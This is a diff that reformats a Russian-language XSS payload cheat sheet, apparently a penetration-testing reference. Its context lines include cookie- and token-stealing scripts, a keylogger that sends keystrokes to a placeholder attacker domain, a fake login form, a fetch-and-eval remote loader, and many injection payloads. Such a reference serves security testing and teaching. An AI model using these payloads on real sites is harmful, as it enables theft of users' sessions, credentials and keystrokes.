@@ -3,43 +3,43 @@
 > Межсайтовый скриптинг (XSS) — это тип уязвимости компьютерной безопасности, обычно встречающийся в веб-приложениях. XSS позволяет злоумышленникам внедрять вредоносный код на веб-сайт, который затем выполняется в браузере любого, кто посещает этот сайт. Это может позволить злоумышленникам украсть конфиденциальную информацию, такую как учётные данные пользователя, или выполнять другие вредоносные действия.
 
 ## Содержание
+## Содержание
 
-- Методология
-- Proof of Concept (PoC)
-  - Перехват данных (Data Grabber)
-  - CORS
-  - Подмена UI (UI Redressing)
-  - JavaScript-кейлоггер
-  - Другие способы
-- Идентификация XSS-точки входа
-  - Инструменты
-- XSS в HTML/приложениях
-  - Распространённые полезные нагрузки
-  - XSS с использованием HTML5-тегов
-  - XSS с использованием удалённого JS
-  - XSS в скрытых полях (Hidden Input)
-  - XSS при выводе в верхнем регистре
-  - DOM-based XSS
-  - XSS в контексте JavaScript
-- XSS в обёртках URI
-  - Обёртка javascript:
-  - Обёртка data:
-  - Обёртка vbscript:
-- XSS в файлах
-  - XSS в XML
-  - XSS в SVG
-  - XSS в Markdown
-  - XSS в CSS
-- XSS в PostMessage
-- Blind XSS
-  - XSS Hunter
-  - Другие инструменты для Blind XSS
-  - Точки входа для Blind XSS
-  - Советы
-- Mutated XSS
-- Лабораторные работы
-- Ссылки
-
+- [Методология](#Методология)
+- [Proof of Concept (PoC)](#Proof-of-Concept-PoC)
+  - [Перехват данных (Data Grabber)](#Перехват-данных-Data-Grabber)
+  - [CORS](#CORS)
+  - [Подмена UI (UI Redressing)](#Подмена-UI-UI-Redressing)
+  - [JavaScript-кейлоггер](#JavaScript-кейлоггер)
+  - [Другие способы](#Другие-способы)
+- [Идентификация XSS-точки входа](#Идентификация-XSS-точки-входа)
+  - [Инструменты](#Инструменты)
+- [XSS в HTML/приложениях](#XSS-в-HTMLприложениях)
+  - [Распространённые полезные нагрузки](#Распространённые-полезные-нагрузки)
+  - [XSS с использованием HTML5-тегов](#XSS-с-использованием-HTML5-тегов)
+  - [XSS с использованием удалённого JS](#XSS-с-использованием-удалённого-JS)
+  - [XSS в скрытых полях (Hidden Input)](#XSS-в-скрытых-полях-Hidden-Input)
+  - [XSS при выводе в верхнем регистре](#XSS-при-выводе-в-верхнем-регистре)
+  - [DOM-based XSS](#DOM-based-XSS)
+  - [XSS в контексте JavaScript](#XSS-в-контексте-JavaScript)
+- [XSS в обёртках URI](#XSS-в-обёртках-URI)
+  - [Обёртка javascript:](#Обёртка-javascript)
+  - [Обёртка data:](#Обёртка-data)
+  - [Обёртка vbscript:](#Обёртка-vbscript)
+- [XSS в файлах](#XSS-в-файлах)
+  - [XSS в XML](#XSS-в-XML)
+  - [XSS в SVG](#XSS-в-SVG)
+  - [XSS в Markdown](#XSS-в-Markdown)
+  - [XSS в CSS](#XSS-в-CSS)
+- [XSS в PostMessage](#XSS-в-PostMessage)
+- [Blind XSS](#Blind-XSS)
+  - [XSS Hunter](#XSS-Hunter)
+  - [Другие инструменты для Blind XSS](#Другие-инструменты-для-Blind-XSS)
+  - [Точки входа для Blind XSS](#Точки-входа-для-Blind-XSS)
+  - [Советы](#Советы)
+- [Mutated XSS](#Mutated-XSS)
+- [Лабораторные работы](#Лабораторные-работы)
+- [Ссылки](#Ссылки)
 
 **3 основных типа XSS-атак**
 
@@ -64,6 +64,8 @@
 <script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
 <script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
 ```
+[Прим.](Прим):
+Чтобы отловить все события на странице DevTools-Console-monitorEvents(window, 'click') 
 
 **Скрипт для записи собранных данных в файл (PHP):**
 
@@ -76,9 +78,7 @@ fclose($fp);
 ?>
 ```
 
----
-
-### CORS
+## CORS
 
 ```html
 <script>
@@ -90,11 +90,9 @@ fclose($fp);
 </script>
 ```
 
----
+## Подмена UI (UI Redressing)
 
-### Подмена UI (UI Redressing)
-
-Используйте XSS для изменения HTML-содержимого страницы и отображения поддельной формы входа:
+XSS для изменения HTML-содержимого страницы и отображения поддельной формы входа:
 
 ```html
 <script>
@@ -103,32 +101,27 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 </script>
 ```
 
----
+## JavaScript-кейлоггер
 
-### JavaScript-кейлоггер
-
-Кейлоггер перехватывает нажатия клавиш и отправляет их злоумышленнику:
+Кейлоггер перехватывает нажатия клавиш и отправляет их:
 
 ```html
 <img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
----
-
-### Другие способы
+## Другие способы
 
 Больше эксплойтов можно найти на [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):
 
-- Создание скриншотов через XSS и HTML5 Canvas
-- JavaScript-сканер портов
-- Сканер сети
-- Выполнение .NET Shell
-- Перенаправление формы
-- Воспроизведение музыки
+- [Создание скриншотов через XSS и HTML5 Canvas](https://web.archive.org/web/20120426084546/https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
+- [JavaScript-сканер портов](http://www.gnucitizen.org/blog/javascript-port-scanner/)
+- [Сканер сети](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
+- [Выполнение .NET Shell](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
+- [Перенаправление формы](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
+- [Воспроизведение музыки](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)
 
----
 
-## Идентификация XSS-точки входа
+# Идентификация XSS-точки входа
 
 Эта полезная нагрузка открывает отладчик в консоли разработчика вместо всплывающего окна:
 
@@ -136,7 +129,9 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 <script>debugger;</script>
 ```
 
-Современные приложения с хостингом контента могут использовать **песочницы (sandbox domains)** для безопасного размещения пользовательского контента. Многие из них изолируют загруженный HTML, JavaScript или Flash, чтобы они не могли получить доступ к пользовательским данным.
+Современные приложения с хостингом контента могут использовать **песочницы (sandbox domains)** для безопасного размещения пользовательского контента. 
+
+> Многие из них изолируют загруженный HTML, JavaScript или Flash, чтобы они не могли получить доступ к пользовательским данным.
 
 **Поэтому лучше использовать `alert(document.domain)` или `alert(window.origin)`, а не `alert(1)`, чтобы понять, в каком контексте выполняется XSS.**
 
@@ -152,7 +147,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 <script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
 ```
 
-### Дополнительное чтение
+Дополнительное чтение:
 
 - [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domains)
 - [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=1d9W0lK9R4E)
@@ -160,23 +155,21 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-### Инструменты
+**Инструменты**
 
 Большинство инструментов также подходят для Blind XSS:
 
 | Инструмент | Описание |
 |---|---|
-| **XSSStrike** | Очень популярный, но, к сожалению, не очень хорошо поддерживаемый |
-| **xsser** | Использует headless-браузер для обнаружения XSS-уязвимостей |
-| **Dalfox** | Обширная функциональность и очень быстрый благодаря реализации на Go |
-| **XSpear** | Похож на Dalfox, но на Ruby |
-| **domdig** | Тестер XSS на базе Headless Chrome |
+| [XSSStrike](https://github.com/s0md3v/XSStrike) | Очень популярный, но, к сожалению, не очень хорошо поддерживаемый |
+| [xsser](https://github.com/epsylon/xsser) | Использует headless-браузер для обнаружения XSS-уязвимостей |
+| [Dalfox](https://github.com/hahwul/dalfox) | Обширная функциональность и очень быстрый благодаря реализации на Go |
+| [XSpear](https://github.com/hahwul/XSpear) | Похож на Dalfox, но на Ruby |
+| [domdig](https://github.com/fcavallarin/domdig) | Тестер XSS на базе Headless Chrome |
 
----
+# XSS в HTML/приложениях
 
-## XSS в HTML/приложениях
-
-### Распространённые полезные нагрузки
+## Распространённые полезные нагрузки
 
 **Базовые полезные нагрузки:**
 
@@ -233,7 +226,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-### XSS с использованием HTML5-тегов
+## XSS с использованием HTML5-тегов
 
 ```html
 <body onload=alert(/XSS/.source)>
@@ -256,7 +249,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-### XSS с использованием удалённого JS
+## XSS с использованием удалённого JS
 
 ```html
 <svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
@@ -267,7 +260,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-### XSS в скрытых полях (Hidden Input)
+## XSS в скрытых полях (Hidden Input)
 
 ```html
 <input type="hidden" accesskey="X" onclick="alert(1)">
@@ -279,7 +272,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-### XSS при выводе в верхнем регистре
+## XSS при выводе в верхнем регистре
 
 ```html
 <IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
@@ -287,7 +280,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-### DOM-based XSS
+## DOM-based XSS
 
 На основе источника (sink) DOM XSS:
 
@@ -297,7 +290,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-### XSS в контексте JavaScript
+## XSS в контексте JavaScript
 
 ```javascript
 -(confirm)(document.domain)//
@@ -306,9 +299,9 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ---
 
-## XSS в обёртках URI
+# XSS в обёртках URI
 
-### Обёртка javascript:
+## Обёртка javascript:
 
 ```html
 javascript:prompt(1)
@@ -353,7 +346,7 @@ javascript://anything%0D%0A%0D%0Awindow.alert(1)
 
 ---
 
-### Обёртка data:
+## Обёртка data:
 
 ```html
 data:text/html,<script>alert(0)</script>
@@ -363,7 +356,7 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 
 ---
 
-### Обёртка vbscript (только Internet Explorer)
+## Обёртка vbscript (только Internet Explorer)
 
 ```html
 vbscript:msgbox("XSS")
@@ -371,9 +364,9 @@ vbscript:msgbox("XSS")
 
 ---
 
-## XSS в файлах
+# XSS в файлах
 
-### XSS в XML
+## XSS в XML
 
 > **Примечание:** Секция CDATA используется, чтобы JavaScript не обрабатывался как XML-разметка.
 
@@ -394,7 +387,7 @@ vbscript:msgbox("XSS")
 
 ---
 
-### XSS в SVG
+## XSS в SVG
 
 **Простой скрипт (Зелёный треугольник):**
 
@@ -476,7 +469,7 @@ vbscript:msgbox("XSS")
 
 ---
 
-### XSS в Markdown
+## XSS в Markdown
 
 ```markdown
 [a](javascript:prompt(document.cookie))
@@ -487,7 +480,7 @@ vbscript:msgbox("XSS")
 
 ---
 
-### XSS в CSS
+## XSS в CSS
 
 ```html
 <!DOCTYPE html>
@@ -508,7 +501,7 @@ div  {
 
 ---
 
-## XSS в PostMessage
+# XSS в PostMessage
 
 Если целевой источник — `*` (звёздочка), сообщение может быть отправлено на любой домен, имеющий ссылку на дочернюю страницу:
 
@@ -537,15 +530,17 @@ document.getElementById('btn').onclick = function(e){
 
 ---
 
-## Blind XSS
+# Blind XSS
 
-### XSS Hunter
+## XSS Hunter
 
-**XSS Hunter** позволяет находить все виды XSS-уязвимостей, включая часто пропускаемый Blind XSS. Сервис работает путём размещения специальных XSS-зондов, которые при срабатывании сканируют страницу и отправляют информацию о ней в сервис XSS Hunter.
+> XSS Hunter - позволяет находить все виды XSS-уязвимостей, включая часто пропускаемый Blind XSS. Сервис работает путём размещения специальных XSS-зондов, которые при срабатывании сканируют страницу и отправляют информацию о ней в сервис XSS Hunter.
 
-> **Примечание:** XSS Hunter устарел. Доступна альтернативная версия:
-> - Самостоятельная версия: [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
-> - Хостинг: [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com)
+**Примечание:** [XSS Hunter](https://xsshunter.com) устарел. 
+
+Доступна альтернативная версия:
+- Самостоятельная версия: [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
+- Хостинг: [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com)
 
 **Полезные нагрузки:**
 
@@ -557,17 +552,17 @@ document.getElementById('btn').onclick = function(e){
 
 ---
 
-### Другие инструменты для Blind XSS
+## Другие инструменты для Blind XSS
 
 | Инструмент | Описание |
 |---|---|
-| **Netflix-Skunkworks/sleepy-puppy** | Фреймворк управления XSS-полезными нагрузками |
-| **LewisArdern/bXSS** | Утилита для обнаружения Blind XSS |
-| **ssl/ezXSS** | Простой способ тестирования Blind XSS |
+| [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) | Фреймворк управления XSS-полезными нагрузками |
+| [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) | Утилита для обнаружения Blind XSS |
+| [ssl/ezXSS](https://github.com/ssl/ezXSS) | Простой способ тестирования Blind XSS |
 
 ---
 
-### Точки входа для Blind XSS
+## Точки входа для Blind XSS
 
 - Контактные формы
 - Системы поддержки (тикеты)
@@ -582,7 +577,7 @@ document.getElementById('btn').onclick = function(e){
 
 ---
 
-### Советы
+## Советы
 
 Используйте перехватчик данных и однострочный HTTP-сервер для подтверждения существования Blind XSS перед развёртыванием тяжёлых инструментов.
 
@@ -600,7 +595,7 @@ ruby -run -ehttpd . -p8080
 
 ---
 
-## Mutated XSS
+# Mutated XSS
 
 Используйте особенности браузеров для воссоздания некоторых HTML-тегов.
 
